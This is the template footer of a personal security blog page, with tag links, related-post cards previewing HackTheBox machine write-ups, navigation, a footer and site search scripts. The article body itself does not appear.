        <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
      
        
        <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
      
        
        <a class="post-tag" href="/blog/en/tags/content/">content</a>
      
        
        <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
      
        
        <a class="post-tag" href="/blog/en/tags/on-going/">On-going</a>
      
        
        <a class="post-tag" href="/blog/en/tags/practical-reverse-engineering/">Practical Reverse Engineering</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/blog/en/posts/HTB-Cap/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Oct  1<i class="unloaded">2021-10-01T00:00:00+08:00</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Cap</h3>
            <div class="text-muted small">
              <p>
                





                Hello everyone, while preparing chapters of the book Practical Reverse Engineering, I occasionally got bored and wanted to do something else to have my mind a reboot. That is the reason why we are ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/blog/en/posts/HTB-Sharp/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >May 16<i class="unloaded">2021-05-16T03:45:00+08:00</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Sharp</h3>
            <div class="text-muted small">
              <p>
                





                Hi, after a long time not posting anything on this blog because of my university workload. Let’s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) mac...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/blog/en/posts/HTB-Armageddon/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >May 28<i class="unloaded">2021-05-28T03:45:00+08:00</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Armageddon</h3>
            <div class="text-muted small">
              <p>
                





                This is another challenge on HackTheBox - Armageddon. Let’s get started.

Enumeration

Nmap

We start by enumerating open ports and services on the target machine using nmap:

┌──(root💀kali)-[/home...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/blog/en/posts/HTB-Cap/" class="btn btn-outline-primary"
    prompt="Older">
    <p>HackTheBox - Cap</p>
  </a>
  

  
  <span class="btn btn-outline-primary disabled"
    prompt="Newer">
    <p>-</p>
  </span>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/0x7c00">The Archivist</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Most rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by Github Pages and Jekyll.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a>
      
        
        <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/blog/en/tags/network/">network</a>
      
        
        <a class="post-tag" href="/blog/en/tags/kma/">kma</a>
      
        
        <a class="post-tag" href="/blog/en/tags/machine/">machine</a>
      
        
        <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a>
      
        
        <a class="post-tag" href="/blog/en/tags/content/">content</a>
      
        
        <a class="post-tag" href="/blog/en/tags/miscs/">miscs</a>
      
        
        <a class="post-tag" href="/blog/en/tags/on-going/">On going</a>
      
        
        <a class="post-tag" href="/blog/en/tags/practical-reverse-engineering/">Practical Reverse Engineering</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/blog/en/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="https://legiahuyy.github.io{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>





<script defer src="/blog/en/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

